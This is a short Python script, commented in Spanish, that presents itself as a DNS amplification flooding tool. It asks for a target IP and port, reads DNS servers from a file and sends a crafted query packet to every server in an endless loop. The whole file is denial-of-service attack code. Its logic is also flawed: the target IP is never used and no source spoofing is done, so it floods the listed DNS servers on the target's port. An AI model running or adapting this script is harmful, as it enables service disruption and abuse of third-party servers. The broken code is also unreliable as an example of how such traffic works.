import socket

def build_dns_payload():
    # Simple DNS query for amplification (Type A, domain: .)
    return b'\x00\x00' + b'\x00\x00' + b'\x00\x01' + b'\x00\x00' * 3 + b'\x00' + b'\x00\x01' + b'\x00\x01'

def main():
    target_ip = input("Ingresa la IP de destino: ").strip()
    target_port = int(input("Ingresa el puerto de destino: ").strip())

    # Leer lista de servidores DNS desde dns.txt
    with open("dns.txt", "r") as f:
        dns_servers = [line.strip() for line in f if line.strip()]

    dns_payload = build_dns_payload()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while True:
            for dns_ip in dns_servers:
                sock.sendto(dns_payload, (dns_ip, target_port))
            # Puedes agregar un pequeño delay si quieres limitar la velocidad
            # time.sleep(0.001)
    except KeyboardInterrupt:
        print("\nEnvío detenido por el usuario.")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
